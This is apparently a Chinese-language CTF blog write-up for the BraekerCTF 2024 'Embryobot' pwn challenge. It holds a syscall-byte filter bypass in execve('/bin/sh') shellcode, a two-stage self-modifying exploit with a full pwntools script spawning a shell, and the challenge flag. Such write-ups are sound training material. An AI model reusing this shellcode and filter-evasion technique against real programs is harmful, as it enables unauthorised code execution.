---
title: shellcode题目
tags: [ctf-pwn]
date: 2024-04-10 00:00:00
categories: [ctf-pwn]
excerpt: BraekerCTF 2024 Embryobot
---

#### shellcode的一些trick

```python
//检查不许出现syscall的字节： 
if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", l);
      exit(1);
    }

把push 0x50f改成 push 0x50e ; inc qword ptr [rsp] 
shellcode =  \
'''
/* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi /* '-p\x00' */
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* 0x3b */
    pop rax
    //syscall
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
'''
```





#### 题目1

BraekerCTF 2024 Embryobot

参考 https://ctftime.org/writeup/38694

只给了一个base64，没给文件，解密出来就是elf

f0VMRgEBAbADWTDJshLNgAIAAwABAAAAI4AECCwAAAAAAADo3////zQAIAABAAAAAAAAAACABAgAgAQITAAAAEwAAAAHAAAAABAAAA==

#### WriteUP

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat test  
ELF�Y0ɲ#,�����4 LL                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ file test    
test: ELF 32-bit LSB executable, Intel 80386, version 1, statically linked, no section header
```

发现这是一个elf文件，并且可以执行

在ida里查看start处调用了一个函数，到08048007

```assembly
LOAD:08048007                               loc_8048007:                  
LOAD:08048007 B0 03                         mov     al, 3
LOAD:08048009 59                            pop     ecx
LOAD:0804800A 30 C9                         xor     cl, cl
LOAD:0804800C B2 12                         mov     dl, 12h
LOAD:0804800E CD 80                         int     80h
LOAD:0804800E
LOAD:08048010 02 00                         add     al, [eax]
LOAD:08048012 03 00                         add     eax, [eax]
LOAD:08048014 01 00                         add     [eax], eax
LOAD:08048014
LOAD:08048014                               ; ------------------------------
LOAD:08048016 00 00                         dw 0
LOAD:08048018 23 80 04 08                   dd offset start
LOAD:0804801C 2C 00 00 00                   dd 2Ch
LOAD:08048020 00 00 00                      db 3 dup(0)
LOAD:08048023                               ; -------------------------------
LOAD:08048023
LOAD:08048023                               public start
LOAD:08048023                               start:                        
LOAD:08048023 E8 DF FF FF FF                call    loc_8048007
```

这个函数调用了一个0x80，但是这里看不懂是干什么，动态调试一下

```assembly
─────────────────────────────────────────────────────────────────────────────
pwndbg> x/10i 0x8048000
   0x8048000:   jg     0x8048047
   0x8048002:   dec    esp
   0x8048003:   inc    esi
   0x8048004:   add    DWORD PTR [ecx],eax
   0x8048006:   add    DWORD PTR [eax-0x36cfa6fd],esi
   0x804800c:   mov    dl,0x12
   0x804800e:   int    0x80
=> 0x8048010:   add    al,BYTE PTR [eax]
   0x8048012:   add    eax,DWORD PTR [eax]
   0x8048014:   add    DWORD PTR [eax],eax
```

结合程序实际运行的状况，这个程序里唯一的一个int 0x80应该是一个输入

输入的地址猜测应该是在ecx上（是第三个参数，第一个是调用号eax，第二个是文件描述符ebx）

```assembly
pwndbg> reg ecx
 ECX  0x8048000 ◂— jg 0x8048047 /* 0x464c457f */
```

而这个0x8048000就是程序的起始地址（ida里可以看到），也就是说，这个程序从通过sys_read读了一个字符串放到了程序开头

我们需要做的就是修改一下这个程序的指令，再跳转回来执行我们写入的指令，当我们第二次执行到输入的时候，通过shellcode获取bash

当执行完int0x80之后，下一条指令在偏移量为0x10的位置上

```assembly
LOAD:0804800E CD 80                         int     80h
LOAD:0804800E
LOAD:08048010 02 00                         add     al, [eax]
```

下一条指令原本时add al, [eax]，我们想重新执行一下前面的代码，因此把他覆盖成一个jmp指令

```
jmp ecx
```

ecx是0x08048000没变，相当于读取输入之后，由回到开头，马上又要重新执行一遍0x08048000~0x08048010这部分代码

这部分代码原本是

```assembly
LOAD:08048007 B0 03                         mov     al, 3
LOAD:08048009 59                            pop     ecx
LOAD:0804800A 30 C9                         xor     cl, cl
LOAD:0804800C B2 12                         mov     dl, 12h
LOAD:0804800E CD 80                         int     80h
```

第一条指令不变，把第二个改成add ecx, 0x10，这样的目的是指向一段无关紧要的地址，用来作为输入shellcode的空间

在sys_read时第四个参数（edx）是读取的buffer的空间，之前的0x12可能不够用，改大一点（这里不一定非要0x80）

```
 mov al, 0x3
 add ecx, 0x10
 mov dl, 0x80
 int 0x80
```

这样第二次输入一个shellcode，就会被放到int 0x80之后继续执行，然后就可以获得shell了

由于0x08048000~0x08048010是16个字节，需要补齐

```assembly
nop
nop
nop
nop
nop
nop
nop
mov al, 0x3
add ecx, 0x10
mov dl, 0x80
int 0x80
jmp ecx
```

这里nop指令的位置不重要，放前边放后边穿插着来都无所谓，保证jmp的位置就可以





完整exp

```python
from pwn import *

#p = remote("124.16.75.162",31058 )
p = process("./test")

#gdb.attach(p)
#pause()

stage1 = asm(
"""
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov al, 0x3
    add ecx, 0x10
    mov dl, 0x80
    int 0x80
    jmp ecx
""")
p.send(stage1)
p.send(asm(shellcraft.sh()))
p.interactive()
```



flag是

```
flag{159d60ad-1703-430c-bf9f-ea54e68b9dbf}
```



